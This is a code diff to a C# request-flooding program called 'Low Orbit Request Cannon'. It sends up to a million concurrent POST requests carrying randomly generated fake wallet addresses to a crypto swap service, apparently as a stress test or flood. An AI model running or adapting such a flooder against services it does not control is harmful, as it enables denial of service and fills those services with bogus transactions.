@@ -9,17 +9,28 @@ namespace AsmodatLowOrbitRequestCannon
 {
     public class Payload
     {
-        public Payload(string address)
+        public enum Currencies
         {
-            client_address = address;
+            BNB = 0,
+            SENT = 1,
+            ETH = 2,
+            PIVX = 3
         }
 
-        public string client_address;
-        public int delay_in_seconds = 60;
-        public string destination_address = "0x47bd80a152d0d77664d65de5789df575c9cabbdb";
-        public string from_symbol = "SENT";
+        public Payload(string address, Currencies from, Currencies to, long delay = 60)
+        {
+            destination_address = address;
+            from_symbol = from.ToString();
+            to_symbol = to.ToString();
+            delay_in_seconds = delay;
+        }
+
+        public string destination_address;
+        public string from_symbol;
+        public string to_symbol;
+        public long delay_in_seconds;
+        public string client_address = "0x47bd80a152d0d77664d65de5789df575c9cabbdb";
         public string node_address = "0x47bd80a152d0d77664d65de5789df575c9cabbdb";
-        public string to_symbol = "SENT";
     }
 
     public class Swix
@@ -58,15 +69,16 @@ namespace AsmodatLowOrbitRequestCannon
 
         static void Main(string[] args)
         {
-            int intensity2 = args.Length > 1 ? args[1].ToIntOrDefault(60) : 60;
-            int intensity1 = (args.Length > 0 ? args[0].ToIntOrDefault(1000000) : 1000000) / intensity2;
+            var intensity2 = args.Length > 1 ? args[1].ToIntOrDefault(60) : 60;
+            var intensity1 = (args.Length > 0 ? args[0].ToIntOrDefault(1000000) : 1000000) / intensity2;
+            var verify = args.Length > 2 ? args[2].ToBoolOrDefault(true) : true;
             Console.WriteLine("Asmodat Low Orbit Request Cannon v0.1");
             Console.WriteLine($"Iterations: {intensity1 * intensity2}, Intensity: {intensity2}");
-            Run(intensity1, intensity2);
+            Run(intensity1, intensity2, verify);
             Console.WriteLine("Done");
         }
 
-        private static void Run(int intensity1, int intensity2)
+        private static void Run(int intensity1, int intensity2, bool verify)
         {
             var sw = Stopwatch.StartNew();
             int sCounter = 0;
@@ -79,7 +91,7 @@ namespace AsmodatLowOrbitRequestCannon
                     bool success;
                     try
                     {
-                        success = await Swix();
+                        success = await Swix(verify);
 
                         lock (_locker)
                         {
@@ -108,14 +120,35 @@ namespace AsmodatLowOrbitRequestCannon
             });
         }
         
-        private static async Task<bool> Swix()
+        private static async Task<bool> Swix(bool verify)
         {
             using (var client = new HttpClient() { Timeout = TimeSpan.FromMinutes(60) })
             {
-                var content = new StringContent(new Payload($"0x{RandomEx.NextHexString(40)}").JsonSerialize(), encoding: Encoding.UTF8);
+                var from = (Payload.Currencies)RandomEx.Next(0, 4);
+                var to = (Payload.Currencies)RandomEx.Next(0, 4);
+                string address = null;
+
+                if ((to == Payload.Currencies.PIVX))
+                    address = $"D{RandomEx.NextAlphanumeric(33).ReplaceMany(("I", "L"), ("i", "l"),("0","1"), ("O","P"))}";
+                else
+                    address = $"0x{RandomEx.NextHexString(40)}";
+
+                var delay = 60;
+                var json = new Payload(address, from, to, delay).JsonSerialize();
+
+                var content = new StringContent(json, encoding: Encoding.UTF8);
                 var response = await client.POST(_requestUrl1, content, System.Net.HttpStatusCode.OK, false, _headers);
-                var check = await client.GET($"{_requestUrl2}{response.JsonDeserialize<Swix>().swix_hash}", System.Net.HttpStatusCode.OK);
-                return check.JsonDeserialize<SwixRsponse>().success;
+
+                if (!response.JsonDeserialize<Swix>().swix_hash.IsNullOrWhitespace())
+                {
+                    if (!verify)
+                        return true;
+
+                    var check = await client.GET($"{_requestUrl2}{response.JsonDeserialize<Swix>().swix_hash}", System.Net.HttpStatusCode.OK);
+                    return check.JsonDeserialize<SwixRsponse>().success;
+                }
+                else
+                    throw new Exception($"Server failed with message: {response}, after receiving payload: {json}");
             }
         }
     }
